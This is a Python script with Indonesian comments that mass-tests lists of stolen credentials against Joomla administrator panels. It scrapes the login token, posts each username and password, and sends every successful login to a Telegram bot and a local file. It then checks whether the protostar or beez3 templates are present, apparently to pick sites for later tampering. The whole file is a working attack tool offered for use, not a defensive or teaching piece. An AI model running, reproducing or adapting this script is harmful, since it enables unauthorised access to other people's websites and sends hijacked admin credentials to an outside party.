import requests
from bs4 import BeautifulSoup
from telegram import Bot
import sys
import time

# =========================
# KONFIGURASI TELEGRAM
# =========================
TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN'
CHAT_ID = 'YOUR_CHAT_ID'

bot = Bot(token=TELEGRAM_TOKEN)

# =========================
# ARGUMEN FILE
# =========================
if len(sys.argv) != 2:
    print(f"Usage: python3 {sys.argv[0]} <list.txt>")
    sys.exit()

filename = sys.argv[1]

# =========================
# LOAD TARGET
# =========================
try:
    with open(filename, "r") as f:
        targets = [x.strip() for x in f if x.strip()]
except FileNotFoundError:
    print(f"[!] File '{filename}' tidak ditemukan.")
    sys.exit()

total = len(targets)
success = 0
failed = 0

# =========================
# LOGIN FUNCTION
# =========================
def try_joomla_login(url, username, password, current, total):
    global success, failed

    session = requests.Session()

    url = url.rstrip("/")
    login_url = f"{url}/administrator/index.php"

    try:
        print("=" * 70)
        print(f"[{current}/{total}] CHECKING")
        print(f"URL      : {url}")
        print(f"USERNAME : {username}")
        print(f"PASSWORD : {password}")
        print("=" * 70)

        headers = {
            "User-Agent": "Mozilla/5.0"
        }

        # =========================
        # GET LOGIN PAGE
        # =========================
        r = session.get(login_url, headers=headers, timeout=10)

        print(f"[+] Status GET : {r.status_code}")

        if r.status_code != 200:
            print("[-] Gagal akses admin panel")
            failed += 1
            return

        soup = BeautifulSoup(r.text, "html.parser")

        # =========================
        # AMBIL TOKEN JOOMLA
        # =========================
        token = None

        for inp in soup.find_all("input", {"type": "hidden"}):
            name = inp.get("name")

            if name and len(name) == 32:
                token = name
                break

        if not token:
            print("[-] Token Joomla tidak ditemukan")
            failed += 1
            return

        print(f"[+] Token ditemukan : {token}")

        # =========================
        # LOGIN PAYLOAD
        # =========================
        payload = {
            "username": username,
            "passwd": password,
            "option": "com_login",
            "task": "login",
            token: "1"
        }

        # =========================
        # POST LOGIN
        # =========================
        response = session.post(
            login_url,
            data=payload,
            headers=headers,
            timeout=10,
            allow_redirects=True
        )

        print(f"[+] Status POST : {response.status_code}")
        print(f"[+] Final URL   : {response.url}")

        success_indicators = [
            "task=logout",
            "mod-login-logout",
            "System Dashboard",
            "Control Panel"
        ]

        # =========================
        # LOGIN SUCCESS
        # =========================
        if any(x in response.text for x in success_indicators):

            print("\n[✓] LOGIN SUCCESS")
            print(f"[✓] {url} | {username} | {password}\n")

            success += 1

            # =========================
            # TELEGRAM NOTIF
            # =========================
            msg = f"""
[JOOMLA LOGIN SUCCESS]

URL  : {url}
USER : {username}
PASS : {password}
"""

            try:
                bot.send_message(chat_id=CHAT_ID, text=msg)
                print("[+] Telegram sent")
            except Exception as tg_err:
                print(f"[!] Telegram error : {tg_err}")

            # =========================
            # SAVE SUCCESS LOGIN
            # =========================
            with open("joomla_success.txt", "a") as save:
                save.write(f"{url}|{username}|{password}\n")

            # =========================
            # CEK TEMPLATE
            # =========================
            try:
                template_url = f"{url}/administrator/index.php?option=com_templates"

                tpl = session.get(
                    template_url,
                    headers=headers,
                    timeout=10
                )

                print(f"[+] Check Template : {tpl.status_code}")

                template_text = tpl.text.lower()

                if "protostar" in template_text or "beez3" in template_text:

                    print("[+] TEMPLATE DETECTED : protostar / beez3")

                    with open("joomla_template_aktif.txt", "a") as tplsave:
                        tplsave.write(f"{url}|{username}|{password}\n")

                else:
                    print("[-] Template protostar/beez3 tidak ditemukan")

            except Exception as tpl_err:
                print(f"[!] Gagal cek template : {tpl_err}")

        else:
            print("[-] LOGIN FAILED\n")
            failed += 1

    except requests.exceptions.Timeout:
        print("[-] TIMEOUT")
        failed += 1

    except requests.exceptions.ConnectionError:
        print("[-] CONNECTION ERROR")
        failed += 1

    except Exception as e:
        print(f"[-] ERROR : {e}")
        failed += 1


# =========================
# START
# =========================
print("\n")
print("=" * 70)
print("JOOMLA LOGIN CHECKER")
print("=" * 70)
print(f"[+] Total target : {total}")
print("=" * 70)

start = time.time()

for i, line in enumerate(targets, start=1):

    parts = line.split("|")

    if len(parts) != 3:
        print(f"[!] Format salah : {line}")
        continue

    url, user, pwd = parts

    try_joomla_login(url, user, pwd, i, total)

end = time.time()

# =========================
# SUMMARY
# =========================
print("\n")
print("=" * 70)
print("SCAN FINISHED")
print("=" * 70)
print(f"[+] Total   : {total}")
print(f"[+] Success : {success}")
print(f"[+] Failed  : {failed}")
print(f"[+] Time    : {round(end - start, 2)} sec")
print("=" * 70)
